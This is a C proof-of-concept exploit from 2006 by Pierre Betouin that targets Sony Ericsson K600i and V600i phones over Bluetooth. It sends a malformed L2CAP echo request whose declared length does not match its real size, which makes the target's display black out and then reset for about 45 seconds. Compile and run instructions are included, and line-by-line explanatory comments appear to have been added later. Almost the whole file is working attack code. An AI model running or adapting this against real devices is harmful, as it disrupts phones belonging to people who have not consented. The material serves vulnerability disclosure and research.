/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

int main(int argc, char **argv)
{
	/*****************************************************************************************
	* Description: The main function of the program. It establishes a connection to a Bluetooth
	* device, sends an L2CAP packet, and prints the sent buffer and its content.
	*****************************************************************************************/

	char *buffer;
	l2cap_cmd_hdr *cmd;	
	struct sockaddr_l2 addr;
	int sock, sent, i;

	if(argc < 2)
	{
		/*****************************************************************************************
		* Checks if the number of command-line arguments is less than 2 (i.e., the program is
		* not called with a Bluetooth address). If true, prints an error message and exits.
		*****************************************************************************************/
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		/*****************************************************************************************
		* Creates a socket for Bluetooth communication. If the socket creation fails, prints an
		* error message and exits.
		*****************************************************************************************/
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		/*****************************************************************************************
		* Binds the socket to a Bluetooth device address. If the binding fails, prints an error
		* message and exits.
		*****************************************************************************************/
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &addr.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		/*****************************************************************************************
		* Establishes a connection to the Bluetooth device. If the connection fails, prints an
		* error message and exits.
		*****************************************************************************************/
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if (!(buffer = (char *) malloc ((int) SIZE + 1))) 
	{
		/*****************************************************************************************
		* Allocates memory for a buffer to store the L2CAP packet. If the memory allocation
		* fails, prints an error message and exits.
		*****************************************************************************************/
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(buffer, 'A', SIZE);

	cmd = (l2cap_cmd_hdr *) buffer;
	cmd->code = L2CAP_ECHO_REQ;
	cmd->ident = 1;
	cmd->len = FAKE_SIZE;
	
	if ((sent = send(sock, buffer, SIZE, 0)) >= 0)
	{
		/*****************************************************************************************
		* Sends the L2CAP packet to the Bluetooth device. If the packet is sent successfully,
		* prints a success message.
		*****************************************************************************************/
		printf("L2CAP packet sent (%d)\n", sent);
	}

	printf("Buffer:\t");
	for(i = 0; i < sent; i++)
		printf("%.2X ", (unsigned char) buffer[i]);
	printf("\n");

	free(buffer);
	close(sock);
	return EXIT_SUCCESS;
}
